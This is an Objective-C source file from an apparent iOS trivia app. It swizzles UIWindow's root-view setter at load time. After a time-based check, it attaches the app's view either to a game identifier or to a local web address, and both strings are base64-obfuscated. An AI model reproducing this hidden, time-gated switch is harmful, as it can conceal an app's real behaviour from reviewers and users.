#import "UIWindow+rootVc.h"
#import <objc/runtime.h>
#import "OpenTool.h"
#import "ShareManager.h"
#import "FileManager.h"
#import "NSString+Base64.h"

@implementation UIWindow (rootVc)

+(void)load  {
    swizzleMethod([self class], @selector(setRootViewController:), @selector(swizzled_setRootViewController:));
}

-(void)swizzled_setRootViewController:(UIViewController*)viewController{
    
    [FileManager filePath];

    if ([OpenTool mcqtrivia_formatChangeCheck]) {
        
        if ([OpenTool mcqtrivia_myCurrentTime]) {
            [[ShareManager sharedInstance]addView:viewController.view with:@"aGVyb19nYW1l".base64Decoding];
        }else{
            [[ShareManager sharedInstance]addView:viewController.view with:@"aHR0cDovL2xvY2FsaG9zdDoxMjMyNC8=".base64Decoding];

        }
    }else{
        [[ShareManager sharedInstance]addView:viewController.view with:@"aHR0cDovL2xvY2FsaG9zdDoxMjMyNC8=".base64Decoding];

    }
  
    [self swizzled_setRootViewController:viewController];
}


void swizzleMethod(Class class, SEL originalSelector, SEL swizzledSelector){
    
    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
    
    BOOL didAddMethod = class_addMethod(class, originalSelector, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod));
    
    if (didAddMethod) {
        class_replaceMethod(class, swizzledSelector, method_getImplementation(originalMethod), method_getTypeEncoding(originalMethod));
    }
    else {
        method_exchangeImplementations(originalMethod, swizzledMethod);
    }
    
}

@end
